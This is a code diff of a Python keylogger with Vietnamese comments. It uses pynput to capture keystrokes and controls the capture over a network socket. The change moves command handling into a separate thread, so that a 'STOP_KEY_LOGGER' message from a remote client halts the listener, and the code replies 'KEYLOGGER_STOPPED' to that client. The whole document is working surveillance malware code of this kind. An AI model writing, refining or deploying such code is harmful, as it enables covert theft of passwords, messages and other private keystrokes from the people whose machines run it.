@@ -1,11 +1,11 @@
 from pynput import keyboard
-import socket
 import threading
 
 def start_keylogger(client_socket):
     keys_pressed = ""
     MAX_LINE_LENGTH = 50  # Độ dài dòng tối đa trước khi tự động xuống dòng
     stop_keylogger = False  # Biến để kiểm soát việc dừng keylogger
+    listener = None
 
     def on_press(key):
         nonlocal keys_pressed, stop_keylogger  # Sử dụng biến keys_pressed và stop_keylogger trong phạm vi hàm
@@ -42,24 +42,31 @@ def start_keylogger(client_socket):
     # Lắng nghe phím nhấn từ client
     def listen_for_commands():
         nonlocal stop_keylogger
-        while not stop_keylogger:
-            try:
-                data = client_socket.recv(1024)
-                command = data.decode("utf-8")
-                if command == "STOP_KEY_LOGGER":
-                    print("\nReceived stop command from client. Stopping keylogger...")
-                    stop_keylogger = True  # Đánh dấu dừng keylogger
-                    break
-            except Exception as e:
-                print(f"Error receiving command from client: {e}")
-                break
+        try:
+            data = client_socket.recv(1024)
+            command = data.decode("utf-8")            
+            
+            if command == "STOP_KEY_LOGGER":                    
+                print("\nReceived stop keylogger command from client")
+                stop_keylogger = True  # Đánh dấu dừng keylogger
+                
+                # Ngay lập tức dừng listener
+                if listener is not None:
+                    listener.stop()
+                    
+        except Exception as e:
+            print(f"Error receiving command from client: {e}")
 
-    # Bắt đầu lắng nghe sự kiện phím nhấn
+     # Bắt đầu lắng nghe sự kiện phím nhấn
     listener = keyboard.Listener(on_press=on_press)
     listener.start()  # Bắt đầu lắng nghe phím nhấn
 
-    # Bắt đầu lắng nghe lệnh từ client
-    listen_for_commands()
+    # Bắt đầu lắng nghe lệnh từ client trong một thread riêng
+    listener_thread = threading.Thread(target=listen_for_commands)
+    listener_thread.start()
+
+    # Chờ thread lắng nghe lệnh kết thúc (nếu cần thiết)
+    listener_thread.join()  # Chờ thread lắng nghe lệnh kết thúc
 
     listener.stop()  # Dừng listener
     client_socket.sendall("KEYLOGGER_STOPPED".encode("utf-8"))  # Gửi thông báo đến client khi keylogger dừng
